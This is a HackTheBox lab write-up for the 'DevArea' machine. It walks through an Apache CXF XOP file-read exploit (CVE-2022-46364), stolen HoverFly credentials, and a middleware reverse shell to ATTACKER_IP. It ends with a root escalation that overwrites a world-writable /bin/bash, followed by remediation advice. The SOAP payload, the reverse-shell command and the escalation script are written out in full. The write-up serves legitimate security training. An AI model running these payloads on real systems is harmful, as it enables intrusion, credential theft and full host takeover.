---
title: "HTB - DevArea"
date: 2026-03-08
tags: ["HackTheBox","Linux","Medium"]
categories: ["Machines&Challenges"]
difficulty: "Medium"
os: "Linux"
author: "z3r0s"
featuredImage: "/logos/DevArea.png"
---
| Field | Value |
|-------|-------|
| Difficulty | Medium |
| OS | Linux (Ubuntu 24.04) |
| Season | 10 |


---

## Summary

DevArea is a Medium Linux machine. An anonymous FTP share exposes a Java SOAP service JAR. Decompiling it reveals Apache CXF with XOP/MTOM processing, vulnerable to CVE-2022-46364 - allowing Local File Inclusion via `<xop:Include href="file:///..."/>` elements. Using this LFI, plaintext HoverFly credentials are extracted from a systemd service file. HoverFly's middleware API then provides unauthenticated RCE. Privilege escalation abuses a world-writable `/bin/bash` combined with a passwordless sudo rule.

---

## Attack Chain Overview

| Stage | Technique | Result |
|-------|-----------|--------|
| Recon | Nmap Scan | 6 Open Ports |
| Enum | Anonymous FTP | JAR File |
| Analysis | CFR Decompile Apache CXF | Found |
| Exploit | SOAP XOP LFI | File Read |
| Creds | Base64 Decode | `admin:O7IJ27MyyXiU` → HoverFly |
| RCE | Middleware Abuse | Reverse Shell → `dev_ryan` |
| PrivEsc | SUID Bash | Root Shell |

---

## 01 - Reconnaissance

```bash
nmap -sC -sV -p- devarea.htb
```

```
PORT     STATE SERVICE      VERSION
21/tcp   open  ftp          vsftpd 3.0.5  (Anonymous login allowed)
22/tcp   open  ssh          OpenSSH 9.6p1
80/tcp   open  http         Apache httpd 2.4.58 (→ devarea.htb)
8080/tcp open  http-proxy   Jetty 9.4.27 (Java SOAP)
8500/tcp open  http         HoverFly Proxy
8888/tcp open  http         HoverFly Admin
```

```bash
echo "10.10.11.XX devarea.htb" | sudo tee -a /etc/hosts
```

---

## 02 - FTP Enumeration

```bash
ftp devarea.htb
# Name: anonymous  /  Password: (blank)
ftp> cd pub
ftp> get employee-service.jar
# 6710538 bytes received
```

---

## 03 - JAR Analysis & Decompilation

```bash
java -jar cfr.jar employee-service.jar --outputdir decompiled
```

**Key Finding:** Apache CXF with JaxWs - SOAP endpoint at `http://devarea.htb:8080/employeeservice`

WSDL: `http://devarea.htb:8080/employeeservice?wsdl`

Relevant CVEs: **CVE-2022-46364** and **CVE-2022-46363**

---

## 04 - Exploiting XOP/MTOM LFI (CVE-2022-46364)

MTOM's XOP Include elements allow reading arbitrary files from the server filesystem, returning contents base64-encoded in the SOAP response.

### Crafting the SOAP Request

```http
POST /employeeservice HTTP/1.1
Host: devarea.htb:8080
Content-Type: multipart/related;
  type="application/xop+xml";
  start="<root.message>";
  boundary="----=_Part"

------=_Part
Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"
Content-ID: <root.message>

<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <ns:getEmployee xmlns:ns="...">
      <arg0>
        <xop:Include
          xmlns:xop="http://www.w3.org/2004/08/xop/include"
          href="file:///etc/passwd"/>
      </arg0>
    </ns:getEmployee>
  </soap:Body>
</soap:Envelope>
------=_Part--
```

### Reading Critical Files

```bash
# Target: file:///etc/systemd/system/hoverfly.service
# Decoded response reveals:
[Service]
ExecStart=/usr/local/bin/hoverfly \
  -username admin \
  -password O7IJ27MyyXiU
```

**Credentials Found: `admin : O7IJ27MyyXiU`**

---

## 05 - HoverFly Authentication & RCE

### Obtaining JWT Token

```bash
curl -X POST http://devarea.htb:8888/api/token-auth \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"O7IJ27MyyXiU"}'
# Response: {"token":"eyJhbGciOiJIUzI1NiIs..."}
```

### Middleware RCE

HoverFly supports middleware scripts that process every HTTP request through the proxy. Authenticated attackers can set a malicious script via `/api/v2/hoverfly/middleware`.

```bash
# Set malicious middleware
curl -X PUT http://devarea.htb:8888/api/v2/hoverfly/middleware \
  -H "Authorization: Bearer <JWT_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{
    "binary": "/bin/bash",
    "script": "#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER_IP/9001 0>&1"
  }'

# Start listener
nc -lvnp 9001

# Trigger the middleware
curl http://devarea.htb:8500/
```

```
dev_ryan@devarea:~$ id
uid=1000(dev_ryan) gid=1000(dev_ryan) groups=1000(dev_ryan)
dev_ryan@devarea:~$ cat user.txt
```

---

## 06 - Privilege Escalation

### Enumeration

```bash
# Check sudo permissions
sudo -l
# (root) NOPASSWD: /opt/syswatch/syswatch.sh

# Check /bin/bash permissions
ls -la /bin/bash
-rwxrwxrwx 1 root root ... /bin/bash
# /bin/bash is WORLD-WRITABLE!
```

**Two critical findings:**
- `/bin/bash` has world-writable permissions - any user can overwrite it
- `dev_ryan` can run `/opt/syswatch/syswatch.sh` as root with no password

### Exploitation

```bash
# Step 1: Copy real bash for later use
cp /bin/bash /tmp/realbash

# Step 2: Create the malicious script
cat << 'EVIL' > /tmp/evil.sh
#!/bin/sh
cp /tmp/realbash /tmp/rootbash
chmod +s /tmp/rootbash
EVIL
chmod +x /tmp/evil.sh

# Step 3: Kill all bash processes to release ETXTBSY lock
/bin/sh -c "killall -9 bash"

# Step 4: Overwrite /bin/bash with our evil script
cp /tmp/evil.sh /bin/bash

# Step 5: Trigger sudo execution
sudo /opt/syswatch/syswatch.sh

# Step 6: Execute SUID rootbash
/tmp/rootbash -p
```

```
rootbash-5.2# id
uid=1000(dev_ryan) gid=1000(dev_ryan) euid=0(root)
rootbash-5.2# cat /root/root.txt
```

---

## Mitigations & Remediation

- **FTP:** Disable anonymous access; don't expose application JARs
- **Apache CXF:** Upgrade to 3.5.5+ or 3.4.10+ to patch CVE-2022-46364/46363; disable MTOM/XOP if not required
- **HoverFly:** Use environment files for credentials; bind admin API to localhost; restrict middleware to trusted scripts
- **System:** Fix world-writable permissions: `chmod 755 /bin/bash`; avoid broad sudo rules on shell scripts

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning |
| FTP Client | Anonymous FTP enumeration |
| CFR Decompiler | JAR decompilation |
| cURL | HTTP requests, LFI exploitation |
| Netcat | Reverse shell listener |
| LinPEAS | Post-exploitation enumeration |
